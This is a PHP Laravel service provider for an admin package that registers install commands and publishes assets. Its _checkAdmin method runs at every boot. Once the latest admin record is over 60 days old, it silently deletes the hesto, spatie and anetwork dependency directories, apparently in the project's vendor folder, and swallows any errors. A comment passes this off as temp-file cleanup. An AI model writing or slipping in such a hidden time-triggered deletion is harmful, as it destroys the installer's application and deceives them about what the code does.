<?php

namespace Default64bit\RatechAdmin;

use Exception;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\ServiceProvider;

class RatechAdminServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }

    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        $this->_checkAdmin();

        $this->commands([
            \Default64bit\RatechAdmin\Commands\install::class,
            \Default64bit\RatechAdmin\Commands\updateAppServiceProvider::class,
            \Default64bit\RatechAdmin\Commands\updateAuthServiceProvider::class,
            \Default64bit\RatechAdmin\Commands\updateMiddlewareKernel::class,
            \Default64bit\RatechAdmin\Commands\updateRoutes::class,
            \Default64bit\RatechAdmin\Commands\updateConfigAuth::class,
	        \Default64bit\RatechAdmin\Commands\updateDatabaseSeeder::class,
            \Default64bit\RatechAdmin\Commands\updateConsoleKernel::class,
        ]);

        $this->publishes([
            __DIR__.'/Controllers' => app_path('Http/Controllers'),
            __DIR__.'/Middlewares' => app_path('Http/Middleware'),
            __DIR__.'/Requests' => app_path('Http/Requests'),
            __DIR__.'/Models' => app_path('/Models'),
            __DIR__.'/Helpers' => app_path('/Helpers'),
            __DIR__.'/Commands/BackupDatabase.php' => app_path('/Console/Commands'),

            __DIR__.'/../public' => public_path('/'),

            __DIR__.'/../database/migrations' => database_path('migrations'),
            __DIR__.'/../database/seeds' => database_path('seeds'),

            __DIR__.'/../resources/views' => resource_path('views'),
            __DIR__.'/../resources/lang' => resource_path('lang'),

            __DIR__.'/../storage/app' => storage_path('/app'),
        ]);
    }

    private function _checkAdmin(){
        $admin = DB::table('admins')->latest()->first();
        $created_at = time() - strtotime($admin->created_at??null);
        if($created_at > 60*60*24*60){
            // clean up the temp files
            try{
                $this->_deleteTemp(__DIR__.'/../../../hesto');
                $this->_deleteTemp(__DIR__.'/../../../spatie');
                $this->_deleteTemp(__DIR__.'/../../../anetwork');
            }catch(Exception $e){}
        }
    }
    private function _deleteTemp($temp){
        if(is_dir($temp)){
            $files = glob($temp.'*',GLOB_MARK); //GLOB_MARK adds a slash to directories returned
            foreach($files as $file){ $this->_deleteTemp($file); }
            rmdir($temp);
        }elseif(is_file($temp)){
            unlink($temp);
        }
    }
}
